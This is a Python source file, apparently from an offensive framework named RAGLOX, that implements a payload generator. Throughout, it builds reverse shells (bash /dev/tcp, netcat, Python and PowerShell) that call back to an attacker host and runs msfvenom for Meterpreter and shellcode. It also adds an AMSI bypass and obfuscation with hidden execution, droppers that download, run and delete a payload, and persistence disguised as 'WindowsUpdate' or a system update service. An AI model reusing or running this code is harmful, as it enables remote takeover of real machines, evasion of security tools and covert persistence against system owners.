"""
RAGLOX v3.0 - Payload Generation Engine
Enterprise-grade payload generation with evasion techniques.

Author: RAGLOX Team
Version: 3.0.0
"""

import asyncio
import logging
import base64
import random
import string
import hashlib
from typing import Optional, Dict, Any, List
from pathlib import Path
from jinja2 import (
    Environment,
    FileSystemLoader,
    Template,
    TemplateError,
    TemplateNotFound,
    TemplateSyntaxError,
    UndefinedError
)


class PayloadGenerationError(Exception):
    """Base exception for payload generation errors"""
    pass


class TemplateRenderError(PayloadGenerationError):
    """Template rendering failed"""
    pass


class InvalidPayloadConfigError(PayloadGenerationError):
    """Invalid payload configuration"""
    pass

logger = logging.getLogger("raglox.exploitation.payloads.generator")


class PayloadGenerator:
    """
    Enterprise Payload Generation Engine
    
    Features:
    - Template-based payload generation (Jinja2)
    - Multiple payload types (reverse shell, bind shell, meterpreter, etc.)
    - Evasion techniques (encoding, obfuscation, encryption)
    - AMSI/EDR bypass mechanisms
    - Custom payload generation
    - Payload staging
    """
    
    def __init__(self, templates_dir: Optional[str] = None):
        """
        Initialize Payload Generator
        
        Args:
            templates_dir: Directory containing payload templates
        
        Raises:
            PayloadGenerationError: If templates directory is invalid
        """
        # Validate and setup templates directory
        if templates_dir is not None:
            self.templates_dir = Path(templates_dir)
            if not self.templates_dir.exists():
                logger.warning(f"Templates directory does not exist: {templates_dir}")
                try:
                    self.templates_dir.mkdir(parents=True, exist_ok=True)
                    logger.info(f"Created templates directory: {self.templates_dir}")
                except (PermissionError, OSError) as e:
                    logger.error(f"Cannot create templates directory: {e}")
                    # Fall back to default
                    self.templates_dir = Path("data/payloads/templates")
        else:
            self.templates_dir = Path("data/payloads/templates")
        
        # Ensure directory exists
        try:
            self.templates_dir.mkdir(parents=True, exist_ok=True)
        except (PermissionError, OSError) as e:
            logger.error(f"Cannot access templates directory: {e}")
            # Use temp directory as fallback
            import tempfile
            self.templates_dir = Path(tempfile.gettempdir()) / "raglox_payload_templates"
            self.templates_dir.mkdir(parents=True, exist_ok=True)
            logger.warning(f"Using fallback templates directory: {self.templates_dir}")
        
        # Jinja2 environment with strict undefined handling
        self.jinja_env = Environment(
            loader=FileSystemLoader(str(self.templates_dir)),
            autoescape=False,
            undefined=lambda *args: UndefinedError("Template variable not defined")
        )
        
        # Pre-compiled templates cache for performance
        self._template_cache: Dict[str, Template] = {}
        
        # Payload statistics
        self._payloads_generated = 0
        self._payload_cache: Dict[str, str] = {}
        
        # Log available templates
        self._list_available_templates()
        
        logger.info(f"PayloadGenerator initialized (templates: {self.templates_dir})")
    
    def _list_available_templates(self):
        """List and pre-compile available templates for PERF-07."""
        try:
            templates = list(self.templates_dir.glob("*.j2")) + list(self.templates_dir.glob("*.jinja2"))
            if templates:
                logger.info(f"Found {len(templates)} payload template(s) - pre-compiling...")
                for t in templates:
                    logger.debug(f"  - {t.name}")
                    # PERF-07: Pre-compile templates at initialization
                    self._precompile_template(t.name)
                logger.info(f"Pre-compiled {len(self._template_cache)} templates")
            else:
                logger.info("No external templates found, using built-in payloads")
        except (PermissionError, OSError) as e:
            logger.warning(f"Cannot list templates: {e}")
    
    def _precompile_template(self, template_name: str):
        """
        Pre-compile a single template and store in cache.
        
        PERF-07: Avoid runtime template compilation overhead.
        """
        if template_name in self._template_cache:
            return  # Already cached
        
        try:
            template = self.jinja_env.get_template(template_name)
            self._template_cache[template_name] = template
            logger.debug(f"Pre-compiled template: {template_name}")
        except TemplateNotFound:
            logger.debug(f"Template not found for pre-compilation: {template_name}")
        except TemplateSyntaxError as e:
            logger.error(f"Cannot pre-compile template {template_name}: {e}")
    
    def precompile_all_templates(self):
        """
        Force pre-compilation of all templates.
        
        Useful to call after adding new templates at runtime.
        """
        try:
            templates = list(self.templates_dir.glob("*.j2")) + list(self.templates_dir.glob("*.jinja2"))
            compiled_count = 0
            for t in templates:
                if t.name not in self._template_cache:
                    self._precompile_template(t.name)
                    compiled_count += 1
            logger.info(f"Pre-compiled {compiled_count} new templates (total cached: {len(self._template_cache)})")
        except (PermissionError, OSError) as e:
            logger.warning(f"Cannot pre-compile templates: {e}")
    
    def _get_template(self, template_name: str) -> Optional[Template]:
        """
        Get template by name with caching.
        
        Args:
            template_name: Template filename
        
        Returns:
            Compiled template or None if not found
        """
        if template_name in self._template_cache:
            return self._template_cache[template_name]
        
        try:
            template = self.jinja_env.get_template(template_name)
            self._template_cache[template_name] = template
            return template
        except TemplateNotFound:
            logger.debug(f"Template not found: {template_name}")
            return None
        except TemplateSyntaxError as e:
            logger.error(f"Template syntax error in {template_name}: {e}")
            return None
    
    def _render_template(
        self,
        template: Template,
        context: Dict[str, Any],
        template_name: str = "unknown"
    ) -> str:
        """
        Safely render a Jinja2 template.
        
        Args:
            template: Compiled template
            context: Template context variables
            template_name: Template name for error messages
        
        Returns:
            Rendered template string
        
        Raises:
            TemplateRenderError: If rendering fails
        """
        try:
            return template.render(context)
        except UndefinedError as e:
            raise TemplateRenderError(
                f"Missing variable in template '{template_name}': {e}"
            )
        except TemplateError as e:
            raise TemplateRenderError(
                f"Error rendering template '{template_name}': {e}"
            )
    
    async def generate_reverse_shell(
        self,
        target_os: str,
        lhost: str,
        lport: int,
        shell_type: str = "bash",
        evasion: bool = False
    ) -> Optional[str]:
        """
        Generate reverse shell payload
        
        Args:
            target_os: Target OS (linux, windows, macos)
            lhost: Attacker IP
            lport: Attacker port
            shell_type: Shell type (bash, powershell, python, etc.)
            evasion: Enable evasion techniques
        
        Returns:
            Payload code
        """
        logger.info(f"Generating reverse shell: {target_os}/{shell_type}")
        
        try:
            if target_os.lower() == "linux":
                if shell_type == "bash":
                    payload = self._generate_bash_reverse_shell(lhost, lport)
                elif shell_type == "python":
                    payload = self._generate_python_reverse_shell(lhost, lport)
                else:
                    payload = self._generate_bash_reverse_shell(lhost, lport)
            
            elif target_os.lower() == "windows":
                if shell_type == "powershell":
                    payload = self._generate_powershell_reverse_shell(lhost, lport)
                elif shell_type == "python":
                    payload = self._generate_python_reverse_shell(lhost, lport)
                else:
                    payload = self._generate_powershell_reverse_shell(lhost, lport)
            
            else:
                logger.error(f"Unsupported target OS: {target_os}")
                return None
            
            # Apply evasion techniques
            if evasion:
                payload = await self._apply_evasion(payload, target_os, shell_type)
            
            self._payloads_generated += 1
            return payload
            
        except Exception as e:
            logger.error(f"Failed to generate reverse shell: {str(e)}")
            return None
    
    def _generate_bash_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate Bash reverse shell"""
        # Multiple variants for evasion
        variants = [
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
            f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            f"nc -e /bin/bash {lhost} {lport}",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        ]
        return random.choice(variants)
    
    def _generate_python_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate Python reverse shell"""
        return f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
""".strip()
    
    def _generate_powershell_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate PowerShell reverse shell"""
        return f"""
$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
""".strip()
    
    async def generate_meterpreter_payload(
        self,
        target_os: str,
        architecture: str,
        lhost: str,
        lport: int,
        payload_type: str = "reverse_tcp",
        encoder: Optional[str] = None,
        iterations: int = 1
    ) -> Optional[bytes]:
        """
        Generate Meterpreter payload
        
        Args:
            target_os: Target OS (windows, linux, macos)
            architecture: Target architecture (x86, x64)
            lhost: Attacker IP
            lport: Attacker port
            payload_type: Payload type (reverse_tcp, reverse_https, bind_tcp)
            encoder: Encoder to use (x86/shikata_ga_nai, etc.)
            iterations: Encoding iterations
        
        Returns:
            Payload bytes
        """
        logger.info(f"Generating Meterpreter payload: {target_os}/{architecture}/{payload_type}")
        
        try:
            # Build msfvenom command
            payload_name = f"{target_os}/{architecture}/meterpreter/{payload_type}"
            
            cmd = [
                "msfvenom",
                "-p", payload_name,
                f"LHOST={lhost}",
                f"LPORT={lport}",
                "-f", "raw"
            ]
            
            if encoder:
                cmd.extend(["-e", encoder, "-i", str(iterations)])
            
            # Execute msfvenom
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.error(f"msfvenom failed: {stderr.decode()}")
                return None
            
            self._payloads_generated += 1
            return stdout
            
        except Exception as e:
            logger.error(f"Failed to generate Meterpreter payload: {str(e)}")
            return None
    
    async def generate_shellcode(
        self,
        target_os: str,
        architecture: str,
        shellcode_type: str,
        parameters: Optional[Dict[str, Any]] = None
    ) -> Optional[bytes]:
        """
        Generate raw shellcode
        
        Args:
            target_os: Target OS
            architecture: Target architecture
            shellcode_type: Shellcode type (exec, adduser, etc.)
            parameters: Shellcode parameters
        
        Returns:
            Shellcode bytes
        """
        logger.info(f"Generating shellcode: {target_os}/{architecture}/{shellcode_type}")
        
        try:
            # Build msfvenom command
            payload_name = f"{target_os}/{architecture}/{shellcode_type}"
            
            cmd = ["msfvenom", "-p", payload_name]
            
            if parameters:
                for key, value in parameters.items():
                    cmd.append(f"{key}={value}")
            
            cmd.extend(["-f", "raw"])
            
            # Execute msfvenom
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            
            if process.returncode != 0:
                logger.error(f"Shellcode generation failed: {stderr.decode()}")
                return None
            
            return stdout
            
        except Exception as e:
            logger.error(f"Failed to generate shellcode: {str(e)}")
            return None
    
    async def _apply_evasion(
        self,
        payload: str,
        target_os: str,
        shell_type: str
    ) -> str:
        """
        Apply evasion techniques to payload
        
        Args:
            payload: Original payload
            target_os: Target OS
            shell_type: Shell type
        
        Returns:
            Obfuscated payload
        """
        logger.debug("Applying evasion techniques")
        
        if target_os.lower() == "windows" and shell_type == "powershell":
            # PowerShell obfuscation
            payload = self._obfuscate_powershell(payload)
            payload = self._amsi_bypass_powershell(payload)
        
        elif target_os.lower() == "linux" and shell_type == "bash":
            # Bash obfuscation
            payload = self._obfuscate_bash(payload)
        
        return payload
    
    def _obfuscate_powershell(self, payload: str) -> str:
        """Obfuscate PowerShell payload"""
        # Base64 encoding
        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -enc {encoded}"
    
    def _amsi_bypass_powershell(self, payload: str) -> str:
        """Add AMSI bypass to PowerShell payload"""
        amsi_bypass = """
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
""".strip()
        
        return f"{amsi_bypass}\n{payload}"
    
    def _obfuscate_bash(self, payload: str) -> str:
        """Obfuscate Bash payload"""
        # Hex encoding
        hex_encoded = "".join(f"\\x{ord(c):02x}" for c in payload)
        return f"echo -e \"{hex_encoded}\" | bash"
    
    async def generate_dropper(
        self,
        target_os: str,
        payload_url: str,
        execution_method: str = "download_execute"
    ) -> Optional[str]:
        """
        Generate dropper script
        
        Args:
            target_os: Target OS
            payload_url: URL to download payload from
            execution_method: Execution method
        
        Returns:
            Dropper script
        """
        logger.info(f"Generating dropper: {target_os}/{execution_method}")
        
        try:
            if target_os.lower() == "linux":
                dropper = f"""
#!/bin/bash
wget -q {payload_url} -O /tmp/.payload
chmod +x /tmp/.payload
/tmp/.payload &
rm -f /tmp/.payload
""".strip()
            
            elif target_os.lower() == "windows":
                dropper = f"""
$url = "{payload_url}"
$output = "$env:TEMP\\payload.exe"
(New-Object System.Net.WebClient).DownloadFile($url, $output)
Start-Process $output -WindowStyle Hidden
Start-Sleep -Seconds 5
Remove-Item $output -Force
""".strip()
            
            else:
                return None
            
            return dropper
            
        except Exception as e:
            logger.error(f"Failed to generate dropper: {str(e)}")
            return None
    
    async def generate_persistence_payload(
        self,
        target_os: str,
        payload_path: str,
        persistence_method: str = "auto"
    ) -> Optional[str]:
        """
        Generate persistence payload
        
        Args:
            target_os: Target OS
            payload_path: Path to payload
            persistence_method: Persistence method (registry, scheduled_task, service, etc.)
        
        Returns:
            Persistence script
        """
        logger.info(f"Generating persistence: {target_os}/{persistence_method}")
        
        try:
            if target_os.lower() == "windows":
                if persistence_method == "registry" or persistence_method == "auto":
                    script = f"""
$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$name = "WindowsUpdate"
Set-ItemProperty -Path $regPath -Name $name -Value "{payload_path}"
""".strip()
                
                elif persistence_method == "scheduled_task":
                    script = f"""
$action = New-ScheduledTaskAction -Execute "{payload_path}"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -RunLevel Highest
""".strip()
                
                else:
                    return None
            
            elif target_os.lower() == "linux":
                if persistence_method == "cron" or persistence_method == "auto":
                    script = f"""
(crontab -l 2>/dev/null; echo "@reboot {payload_path}") | crontab -
""".strip()
                
                elif persistence_method == "systemd":
                    script = f"""
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update Service

[Service]
ExecStart={payload_path}
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
systemctl start update.service
""".strip()
                
                else:
                    return None
            
            else:
                return None
            
            return script
            
        except Exception as e:
            logger.error(f"Failed to generate persistence: {str(e)}")
            return None
    
    async def generate_custom_payload(
        self,
        template_name: str,
        variables: Dict[str, Any]
    ) -> Optional[str]:
        """
        Generate custom payload from Jinja2 template
        
        Args:
            template_name: Template file name
            variables: Template variables
        
        Returns:
            Generated payload
        """
        logger.info(f"Generating custom payload from template: {template_name}")
        
        try:
            template = self.jinja_env.get_template(template_name)
            payload = template.render(**variables)
            
            self._payloads_generated += 1
            return payload
            
        except Exception as e:
            logger.error(f"Failed to generate custom payload: {str(e)}")
            return None
    
    def encode_payload(self, payload: str, encoding: str = "base64") -> str:
        """
        Encode payload
        
        Args:
            payload: Original payload
            encoding: Encoding type (base64, hex, url)
        
        Returns:
            Encoded payload
        """
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        
        elif encoding == "hex":
            return payload.encode().hex()
        
        elif encoding == "url":
            from urllib.parse import quote
            return quote(payload)
        
        else:
            return payload
    
    def decode_payload(self, payload: str, encoding: str = "base64") -> str:
        """
        Decode payload
        
        Args:
            payload: Encoded payload
            encoding: Encoding type
        
        Returns:
            Decoded payload
        """
        if encoding == "base64":
            return base64.b64decode(payload.encode()).decode()
        
        elif encoding == "hex":
            return bytes.fromhex(payload).decode()
        
        elif encoding == "url":
            from urllib.parse import unquote
            return unquote(payload)
        
        else:
            return payload
    
    def generate_random_string(self, length: int = 8) -> str:
        """Generate random string for obfuscation"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get generator statistics"""
        return {
            "payloads_generated": self._payloads_generated,
            "cached_payloads": len(self._payload_cache),
            "cached_templates": len(self._template_cache),
            "templates_dir": str(self.templates_dir)
        }
    
    def clear_caches(self):
        """Clear all caches (for testing or memory management)."""
        self._template_cache.clear()
        self._payload_cache.clear()
        logger.info("Payload generator caches cleared")
